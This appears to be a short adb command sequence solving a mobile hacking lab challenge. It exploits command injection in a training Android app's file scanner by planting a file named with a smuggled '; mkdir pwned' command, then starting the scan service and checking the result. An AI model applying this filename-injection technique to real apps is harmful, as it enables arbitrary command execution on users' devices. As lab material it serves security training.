adb install com.mobilehackinglab.cyclicscanner.apk
adb shell 'touch /sdcard/Download/\;\ mkdir\ pwned'
adb shell 'appops set --uid com.mobilehackinglab.cyclicscanner MANAGE_EXTERNAL_STORAGE allow'
adb shell 'am start-foreground-service com.mobilehackinglab.cyclicscanner/.scanner.ScanService'
adb shell 'ls /sdcard/'

